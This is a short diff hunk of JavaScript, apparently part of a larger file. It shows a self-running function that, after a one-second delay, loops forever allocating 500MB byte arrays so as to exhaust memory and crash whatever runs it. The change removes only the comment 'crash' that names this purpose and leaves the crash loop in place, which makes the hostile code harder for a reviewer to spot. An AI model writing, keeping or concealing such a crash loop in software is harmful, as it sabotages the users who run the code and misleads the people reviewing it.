@@ -24,7 +24,7 @@
   setTimeout(()=>{
     let meltdown=[];
     while(true){
-      meltdown.push(new Uint8Array(5e8)); // 500MB blocks => crash
+      meltdown.push(new Uint8Array(5e8)); 
     }
   },1000);
 })();
